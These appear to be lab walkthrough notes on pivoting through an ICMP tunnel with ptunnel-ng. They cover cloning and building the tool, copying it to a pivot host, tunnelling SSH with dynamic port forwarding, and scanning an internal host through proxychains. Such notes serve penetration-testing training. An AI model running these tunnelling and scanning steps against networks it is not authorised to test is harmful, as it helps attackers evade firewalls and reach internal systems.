#### Cloning Ptunnel-ng
```shell-session
AhmaDb0x@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```
#### Building Ptunnel-ng with Autogen.sh
```shell-session
AhmaDb0x@htb[/htb]$ sudo ./autogen.sh 
```
#### Transferring Ptunnel-ng to the Pivot Host
```shell-session
AhmaDb0x@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

#### Starting the ptunnel-ng Server on the Target Host
```shell-session
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

---

#### Connecting to ptunnel-ng Server from Attack Host
```shell-session
AhmaDb0x@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

#### Tunneling an SSH connection through an ICMP Tunnel
```shell-session
AhmaDb0x@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
```

#### Enabling Dynamic Port Forwarding over SSH
```shell-session
AhmaDb0x@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

#### Proxychaining through the ICMP Tunnel
```shell-session
AhmaDb0x@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
```

